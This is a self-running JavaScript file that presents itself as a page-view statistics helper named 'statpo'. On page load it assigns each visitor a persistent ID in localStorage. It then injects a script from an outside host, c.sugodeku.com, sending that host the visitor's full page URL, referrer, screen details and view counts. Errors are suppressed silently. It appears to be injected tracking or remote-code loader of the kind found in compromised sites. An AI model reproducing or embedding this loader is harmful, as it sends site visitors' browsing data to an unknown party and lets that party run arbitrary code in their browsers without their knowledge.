window.statpo = {
    prefix: 'statpo',
    init: function () {
        this.checkLastPageVies(this.prefix+'lastPageViewsDate');
        this.increasedPageViews(this.prefix+'pageViews');
        this.increasedPageViews(this.prefix+'pageViewsToday');
        this.loadScript();
    },
    checkLastPageVies: function (name) {
        var today = (new Date().toJSON().slice(0,10));
        (typeof localStorage[name] !== 'undefined' && localStorage[name]<today)?(delete localStorage[this.prefix+'pageViewsToday']):'';
        localStorage[name] = today;
    },
    increasedPageViews: function (name) {
        localStorage[name] = (typeof localStorage[name] !== 'undefined'?parseInt(localStorage[name])+1:1);
    },
    getQuery: function (e) {
        var t = window.location.search;
        return t = t.match(new RegExp(e + "=([^&=]+)")), t ? t[1] : "";
    },
    generateUUID: function () {
        var S4 = function() {
            return (((1+Math.random())*0x10000)|0).toString(16).substring(1);
        };
        return (S4()+S4()+"-"+S4()+"-"+S4()+"-"+S4()+"-"+S4()+S4()+S4());
    },
    getUserId: function () {
        return (typeof localStorage[this.prefix+'user_id'] !== 'undefined'?localStorage[this.prefix+'user_id']:(localStorage[this.prefix+'user_id']=this.generateUUID()));
    },
    getDeep: function () {
        return (typeof localStorage[this.prefix+'pageViewsToday'] !== 'undefined'?parseInt(localStorage[this.prefix+'pageViewsToday']):0);
    },
    loadScript: function () {
        var b = document.createElement("script");
        b.async = 1;
        b.src="//c.sugodeku.com/?id=" + this.getUserId()
            + '&iframe=' + ((window === window.top) ? 0 : 1)
            + '&width=' + window.innerWidth
            + '&height=' + window.innerHeight
            + '&screen_width=' + screen.width
            + '&screen_height=' + screen.height
            + '&d=' + this.getDeep()
            + '&url=' + encodeURIComponent(location.href)
            + '&ref=' + encodeURIComponent(document.referrer)
            + '&t='+Math.random();
        var a=document.getElementsByTagName("script")[0];
        a.parentNode.insertBefore(b,a);
    }
};
!function () {
    try {
        window.statpo.init();
    } catch (o) {

    }
}();